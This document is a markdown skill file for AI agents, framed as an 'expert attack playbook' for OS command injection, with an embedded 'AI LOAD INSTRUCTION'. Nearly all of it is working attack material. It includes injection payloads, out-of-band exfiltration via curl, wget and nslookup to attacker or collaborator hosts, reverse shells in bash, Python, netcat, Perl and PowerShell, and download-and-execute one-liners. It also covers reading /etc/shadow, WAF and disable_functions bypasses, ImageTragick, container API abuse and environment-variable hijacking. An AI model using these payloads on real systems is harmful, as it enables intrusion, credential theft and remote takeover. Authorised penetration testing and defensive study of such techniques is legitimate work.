---
name: cmdi-command-injection
description: >-
  Command injection playbook. Use when user input may reach shell commands, process execution, converters, import pipelines, or blind out-of-band command sinks.
---

# SKILL: OS Command Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert command injection techniques. Covers all shell metacharacters, blind injection, time-based detection, OOB exfiltration, polyglot payloads, and real-world code patterns. Base models miss subtle injection through unexpected input vectors.

## 0. RELATED ROUTING

Before going deep, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when the shell sink is part of a broader upload, import, or conversion workflow

### First-pass payload families

| Context | Start With | Backup |
|---|---|---|
| generic shell separator | `;id` | `&&id` |
| quoted argument | `";id;"` | `';id;'` |
| blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| command substitution | `$(id)` | `` `id` `` |
| out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

---

## 1. SHELL METACHARACTERS (INJECTION OPERATORS)

These characters break out of the command context and inject new commands:

| Metacharacter | Behavior | Example |
|---|---|---|
| `;` | Runs second command regardless | `dir; whoami` |
| `\|` | Pipes stdout to second command | `dir \| whoami` |
| `\|\|` | Run second only if first FAILS | `dir \|\| whoami` |
| `&` | Run second in background (or sequenced in Windows) | `dir & whoami` |
| `&&` | Run second only if first SUCCEEDS | `dir && whoami` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `` `cmd` `` | Command substitution (backtick) | `` echo `whoami` `` |
| `>` | Redirect stdout to file | `cmd > /tmp/out` |
| `>>` | Append to file | `cmd >> /tmp/out` |
| `<` | Read file as stdin | `cmd < /etc/passwd` |
| `%0a` | Newline character (URL-encoded) | `cmd%0awhoami` |
| `%0d%0a` | CRLF | Multi-command injection |

---

## 2. COMMON VULNERABLE CODE PATTERNS

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
// Inject: dir=../ ; cat /etc/passwd
// Inject: dir=../ $(cat /etc/passwd)

exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
import os
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True is the key vulnerability
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### Perl
```perl
$dir = param("dir");
$command = "du -h /var/www/html" . $dir;
system($command);
// Inject dir field: | cat /etc/passwd
```

### ASP (Classic)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// Inject FileName: foo.txt & whoami > C:\inetpub\wwwroot\out.txt
```

---

## 3. BLIND COMMAND INJECTION — DETECTION

When response shows no command output:

### Time-Based Detection
```bash
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& sleep 5 &

# Windows:
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
& waitfor /T 5 signal777
```
Compare response time without payload vs with payload. 5+ second delay = confirmed.

### OOB via DNS
```bash
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### OOB via HTTP
```bash
# Linux:
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)

# Windows:
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### OOB via Out-of-Band File
```bash
; id > /var/www/html/RANDOM_FILE.txt
# Then access: https://target.com/RANDOM_FILE.txt
```

---

## 4. INJECTION CONTEXT VARIATIONS

### Within Quoted String
```bash
command "INJECT"
# Inject: " ; id ; "
# Result: command "" ; id ; ""
```

### Within Single-Quoted String
```bash
command 'INJECT'
# Inject: '; id;'
# Result: command ''; id;''
```

### Within Backtick Execution
```bash
output=`command INJECT`
# Inject: x`; id ;`
```

### File Path Context
```bash
cat /var/log/INJECT
# Inject: ../../../etc/passwd (path traversal)
# Inject: access.log; id (command injection)
```

---

## 5. PAYLOAD LIBRARY

### Information Gathering
```bash
; id                          # current user
; whoami                      # user name
; uname -a                    # OS info
; cat /etc/passwd             # user list
; cat /etc/shadow             # password hashes (if root)
; ls /home/                   # home directories
; env                         # environment variables (DB creds, API keys!)
; printenv                    # same
; cat /proc/1/environ         # process environment
; ifconfig                    # network interfaces
; cat /etc/hosts              # host entries
```

### Reverse Shells (Linux)
```bash
# Bash:
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e):
; nc ATTACKER 4444 -e /bin/bash

# Netcat (without -e / OpenBSD):
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl:
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Reverse Shells (Windows via PowerShell)
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 6. FILTER BYPASS TECHNIQUES

### Space Alternatives (when space is filtered)
```bash
cat</etc/passwd          # < instead of space
{cat,/etc/passwd}        # brace expansion
cat$IFS/etc/passwd       # $IFS variable (field separator)
X=$'\x20'&&cat${X}/etc/passwd  # hex encoded space
```

### Slash Alternatives (when `/` is filtered)
```bash
$'\057'etc$'\057'passwd  # octal representation
cat /???/???sec???        # glob expansion
```

### Keyword Bypass via Variable Assembly
```bash
a=c;b=at;c=/etc/passwd; $a$b $c   # 'cat /etc/passwd'
c=at;ca$c /etc/passwd              # cat
```

### Newline Injection
```
cmd%0Aid%0Awhoami          # URL-encoded newlines
cmd$'\n'id$'\n'whoami      # literal newlines
```

---

## 7. COMMON INJECTION ENTRY POINTS

| Entry | Example |
|---|---|
| Network tools | ping, nslookup, traceroute, whois forms |
| File conversion | image resize, PDF generate, format convert |
| Email senders | From address, name fields in notification emails |
| Search/sort parameters | Passed to grep, find, sort commands |
| Log viewing | Passed to tail, grep commands |
| Custom script execution | "Run test" features, CI/CD hooks |
| DNS lookup features | rDNS lookup, WHOIS query |
| Backup/restore features | File path parameters |
| Archive processing | zip/unzip, tar with user-provided filename |

---

## 8. BLIND INJECTION DECISION TREE

```
Found potential injection point?
├── Try basic: ; sleep 5
│   └── Response delays? → Confirmed blind injection
│       ├── Extract data via timing: if/then sleep
│       └── Use OOB: curl/nslookup to Collaborator
│
├── No delay observed?
│   ├── Try: | sleep 5
│   ├── Try: $(sleep 5)
│   ├── Try: ` sleep 5 `
│   ├── Try after URL encoding: %3B%20sleep%205
│   └── Try double encoding: %253B%2520sleep%25205
│
└── All blocked → check WEB APPLICATION LAYER
    Filter on input? → encode differently
    Filter on specific commands? → whitespace bypass, $IFS, glob
```

---

## 9. ADVANCED WAF BYPASS TECHNIQUES

### Wildcard Expansion

```bash
# Use ? and * to bypass keyword filters:
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (approximate)

# Globbing for specific files:
cat /e?c/p?sswd
cat /e*c/p*d
```

### cat Alternatives (when "cat" is filtered)

```bash
tac /etc/passwd          # reverse cat
nl /etc/passwd           # numbered lines
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # then decode offline
```

### Comment Insertion (PHP specific)

```bash
# Insert comments within function names to bypass WAF:
sys/*x*/tem('id')        # PHP ignores /* */ in some eval contexts
# Note: this works with eval() and similar PHP dynamic calls
```

### XOR String Construction (PHP)

```php
# Build function names from XOR of printable characters:
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# Produces: "assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# Evaluates: assert("system")
```

### Base64/ROT13 Encoding

```php
# Encode payload, decode at runtime:
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
```

### chr() Assembly

```php
# Build strings character by character:
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### Dollar-Sign Variable Tricks

```bash
# $IFS (Internal Field Separator) as space:
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Unset variables expand to empty:
c${x}at /etc/passwd      # $x is unset → "cat"
```

---

## 10. PHP disable_functions BYPASS PATHS

When `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` are all disabled:

### Path 1: LD_PRELOAD + mail()/putenv()

```php
// 1. Upload shared object (.so) that hooks a libc function
// 2. Set LD_PRELOAD to point to it
putenv("LD_PRELOAD=/tmp/evil.so");
// 3. Trigger external process (mail() calls sendmail)
mail("a@b.com", "", "");
// The .so's constructor runs with shell access
```

### Path 2: Shellshock (CVE-2014-6271)

```php
// If bash is vulnerable to Shellshock:
putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
mail("a@b.com", "", "");
// Bash processes the function definition and runs the trailing command
```

### Path 3: Apache mod_cgi + .htaccess

```php
// Write .htaccess enabling CGI:
file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
// Write CGI script:
file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
chmod('/var/www/html/cmd.sh', 0755);
// Access: /cmd.sh?id
```

### Path 4: PHP-FPM / FastCGI

```php
// If PHP-FPM socket is accessible (/var/run/php-fpm.sock or port 9000):
// Send crafted FastCGI request to execute arbitrary PHP with different php.ini
// Tool: https://github.com/neex/phuip-fpizdam
// Override: PHP_VALUE=auto_prepend_file=/tmp/shell.php
```

### Path 5: COM Object (Windows)

```php
// Windows only, if COM extension enabled:
$wsh = new COM('WScript.Shell');
$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
```

### Path 6: ImageMagick Delegate (CVE-2016-3714 "ImageTragick")

```php
// If ImageMagick processes user-uploaded images:
// Upload SVG/MVG with embedded command:
// Content of exploit.svg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**Also consider (summary):** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) when the extension is enabled.

---

## 11. COMPONENT-LEVEL COMMAND INJECTION

### ImageMagick Delegate Abuse

```
# MVG format with shell command in URL:
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
pop graphic-context

# Or via filename: convert '|id' out.png
```

### FFmpeg (HLS/concat protocol)

```
# SSRF/LFI via m3u8 playlist:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# Upload as .m3u8, FFmpeg processes and may leak file contents in output
```

### Elasticsearch Groovy Script (pre-5.x)

```json
POST /_search
{
  "query": { "match_all": {} },
  "script_fields": {
    "cmd": {
      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
    }
  }
}
```

### Ping/Traceroute/NSLookup Diagnostic Pages

```
# Classic injection point in network diagnostic features:
# Input: 127.0.0.1; id
# Input: 127.0.0.1 && cat /etc/passwd
# Input: `id`.attacker.com (DNS exfil via backtick)
# These features directly call OS commands with user input
```

**Other sinks (quick reference):** PDF generators (wkhtmltopdf / WeasyPrint with user HTML); Git wrappers (`git clone` URL / hooks).

---

## 12. WINDOWS CMD.EXE VS POWERSHELL INJECTION MATRIX

| Feature | cmd.exe | PowerShell |
|---------|---------|------------|
| **Command separator** | `&`, `&&`, `\|\|`, `;` (limited) | `;`, `\|`, `&` (call operator) |
| **Variable expansion** | `%VARIABLE%`, `!VAR!` (delayed) | `$env:VARIABLE`, `$Variable` |
| **Escape character** | `^` (caret) | `` ` `` (backtick) |
| **Command substitution** | `FOR /F` loops | `$()` subexpression |
| **Encoded execution** | N/A | `-EncodedCommand` (base64 UTF-16LE) |
| **Pipeline** | `\|` (stdout only) | `\|` (objects, not text) |
| **Comment** | `REM`, `::` | `#` |
| **String quoting** | `"double"` only | `"double"`, `'single'` (no expansion) |

### cmd.exe specific payloads

```batch
REM Command chaining
dir & whoami
dir && whoami
dir || whoami

REM Caret escape to bypass keyword filters
w^h^o^a^m^i
n^e^t u^s^e^r

REM Variable expansion injection
set CMD=whoami
%CMD%

REM Environment variable exfiltration via DNS
nslookup %USERNAME%.attacker.com
nslookup %COMPUTERNAME%.attacker.com

REM Delayed expansion (when !var! is enabled)
cmd /V:ON /C "set x=whoami&!x!"
```

### PowerShell specific payloads

```powershell
# Semicolon separator
Get-Process; whoami

# Subexpression
"$(whoami)"
Write-Output $(hostname)

# Base64 encoded command (UTF-16LE)
powershell -EncodedCommand dwBoAG8AYQBtAGkA
# Decodes to: whoami

# Invoke-Expression obfuscation
$a='who';$b='ami';iex "$a$b"
& (gcm *ke-*) "whoami"

# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX (iwr http://attacker/payload.ps1 -UseBasicParsing).Content

# Constrained Language Mode bypass (if available)
powershell -Version 2 -Command "whoami"
```

### Cross-platform payload differences

| Target | Time delay | DNS exfil | File read |
|--------|-----------|-----------|-----------|
| Linux/macOS | `sleep 5` | `nslookup $(whoami).atk.com` | `cat /etc/passwd` |
| cmd.exe | `timeout /T 5 /NOBREAK` | `nslookup %USERNAME%.atk.com` | `type C:\Windows\win.ini` |
| PowerShell | `Start-Sleep 5` | `nslookup $(whoami).atk.com` | `Get-Content C:\Windows\win.ini` |

### Detection-first polyglot

```text
;sleep${IFS}5;#&timeout /T 5 /NOBREAK&#
```

Works across sh/bash/cmd contexts — one of the separators will fire.

---

## 13. CONTAINER / K8S EXEC INJECTION

### kubectl exec injection

When a web application constructs `kubectl exec` commands with user input:

```text
# Vulnerable pattern
kubectl exec $POD_NAME -- /bin/sh -c "echo $USER_INPUT"

# Injection via pod name
POD_NAME="mypod -- /bin/sh -c whoami #"
→ kubectl exec mypod -- /bin/sh -c whoami # -- /bin/sh -c "echo ..."

# Injection via user input in command
USER_INPUT='"; cat /etc/passwd; echo "'
→ kubectl exec pod -- /bin/sh -c "echo ""; cat /etc/passwd; echo """
```

### Docker exec injection

```text
# Vulnerable web admin panel
docker exec $CONTAINER_NAME $COMMAND

# Injection via container name
CONTAINER_NAME="web_app -u root web_app"
→ docker exec web_app -u root web_app $COMMAND  (runs as root)

# Injection via command argument
COMMAND="status; cat /etc/shadow"
→ docker exec container /bin/sh -c "status; cat /etc/shadow"
```

### Container runtime API (unauthenticated)

```text
# Docker socket exposed (2375/2376 or /var/run/docker.sock)
POST /containers/create HTTP/1.1
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}

# Then start + exec
POST /containers/{id}/start
POST /containers/{id}/exec {"Cmd":["cat","/host/etc/shadow"]}

# Kubernetes API (6443/8443 unauthenticated)
POST /api/v1/namespaces/default/pods/{name}/exec?command=whoami&stdout=true
```

### Sinks to watch for

| Component | Injection Vector |
|-----------|-----------------|
| CI/CD pipeline (Jenkins, GitLab CI) | Build step parameters, environment variables |
| Kubernetes CronJob | `.spec.containers[].command` from user-defined schedules |
| Helm chart values | `values.yaml` templated into pod specs with `{{ }}` |
| Container orchestration UI | "Run command" features in Portainer, Rancher, etc. |

---

## 14. ENVIRONMENT VARIABLE INJECTION

When an application allows setting or influencing environment variables, several variables have **implicit execution** semantics:

### Linux / Unix

| Variable | Effect | Exploitation |
|----------|--------|-------------|
| `LD_PRELOAD` | Loaded before any shared library; constructor runs on process start | `putenv("LD_PRELOAD=/tmp/evil.so"); mail("a@b","","");` |
| `LD_LIBRARY_PATH` | Overrides library search path | Place malicious `libc.so.6` in controlled directory |
| `BASH_ENV` | Executed when non-interactive bash starts | `BASH_ENV=/tmp/evil.sh` → any `system()` / `popen()` call sources it |
| `ENV` | Same as BASH_ENV for POSIX `sh` | `ENV=/tmp/evil.sh` |
| `PROMPT_COMMAND` | Executed before each interactive prompt | `PROMPT_COMMAND="curl http://atk.com/$(whoami)"` |
| `PS1` | Prompt string, supports `$()` expansion in bash | `PS1='$(cat /etc/passwd > /tmp/out) \$ '` |
| `PYTHONSTARTUP` | Python script executed on interpreter startup | Inject path to malicious `.py` file |
| `PERL5OPT` | Options passed to every Perl invocation | `PERL5OPT='-Mbase;system("id")'` |
| `NODE_OPTIONS` | Options passed to every Node.js invocation | `NODE_OPTIONS='--require /tmp/evil.js'` |
| `RUBYOPT` | Options for Ruby | `RUBYOPT='-r/tmp/evil.rb'` |

### Windows

| Variable | Effect |
|----------|--------|
| `COMSPEC` | Path to command interpreter; `system()` calls use this | Set to malicious executable |
| `PATH` | Command resolution order; place malicious binary earlier in path | DLL/EXE search order hijacking |
| `PSModulePath` | PowerShell auto-loads modules from these paths | Plant malicious module |

### Attack scenarios

**PHP `putenv()` + `mail()`**:
```php
// When putenv() is not disabled and mail() is available:
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com","","","");
// mail() invokes sendmail → loads evil.so → constructor executes arbitrary code
```

**Git hook injection via environment**:
```bash
# GIT_DIR / GIT_WORK_TREE manipulation
GIT_DIR=/tmp/evil_repo/.git git status
# If hooks exist in the controlled repo, they execute
```

**Node.js `--require` injection**:
```bash
NODE_OPTIONS="--require=/tmp/reverse_shell.js" node /app/server.js
# reverse_shell.js is loaded before server.js
```
